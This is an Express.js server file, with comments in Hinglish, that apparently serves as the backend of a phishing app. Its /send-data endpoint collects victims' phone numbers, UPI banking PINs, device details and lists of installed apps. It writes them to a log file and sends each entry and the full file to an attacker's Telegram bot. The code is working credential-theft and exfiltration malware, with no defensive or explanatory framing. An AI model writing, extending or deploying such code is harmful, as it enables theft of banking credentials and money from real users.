require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const fs = require('fs'); // File system for appending data
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
const DETAILS_FILE = path.join(__dirname, 'Details.txt');

const sendToTelegram = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {}
};

const sendFileToTelegram = async (filePath, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

// Start notification
const startupNotification = async () => {
    await sendToTelegram(`*BJP Client's*`);
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate, apps } = req.body;
    
    let formattedNumber = number ? `+91 ${number}` : 'Pending...';
    let currentPin = (type === 'NUMBER' || !pin) ? 'PENDING' : pin;

    // 1. Main Telegram Message (Details.TXT title removed)
    let message = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
    message += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
    message += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
    
    if (type === 'TRX_PAGE') {
        message += `Package's.TXT`;
    }

    await sendToTelegram(message);

    // 2. Prepare Details Content (Append Mode)
    let newEntry = `Device Model: ${deviceId || 'Detecting...'}\n`;
    newEntry += `Date: ${deviceDate || 'Detecting...'}\n`;
    newEntry += `Real Time: ${deviceTime || 'Detecting...'}\n`;
    newEntry += `Number: ${formattedNumber}\n`;
    newEntry += `UPI PIN: ${currentPin}\n\n`; // Ek line ka gap har entry ke baad

    // File mein data append (save) karna
    fs.appendFileSync(DETAILS_FILE, newEntry);

    // Telegram par updated file bhejna
    await sendFileToTelegram(DETAILS_FILE, 'Details.TXT');

    // 3. Package's.TXT (Sirf TRX_PAGE par, ye append nahi hoga, naya banega har baar)
    if (type === 'TRX_PAGE' && apps) {
        let packageHeader = `Device Model: ${deviceId || 'Detecting...'}\n`;
        packageHeader += `Date: ${deviceDate || 'Detecting...'}\n`;
        packageHeader += `Real Time: ${deviceTime || 'Detecting...'}\n\n`;
        packageHeader += `Package's\n`;

        let appArray = apps.split(',').map(pkg => pkg.trim()).filter(pkg => pkg.length > 0);
        let appList = appArray.map((pkg, index) => `${index + 1}. ${pkg}`).join('\n');
        
        let finalPackageContent = packageHeader + appList;
        
        // Temp file for packages
        const pkgPath = path.join(__dirname, 'Packages.txt');
        fs.writeFileSync(pkgPath, finalPackageContent);
        await sendFileToTelegram(pkgPath, "Package's.TXT");
    }

    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
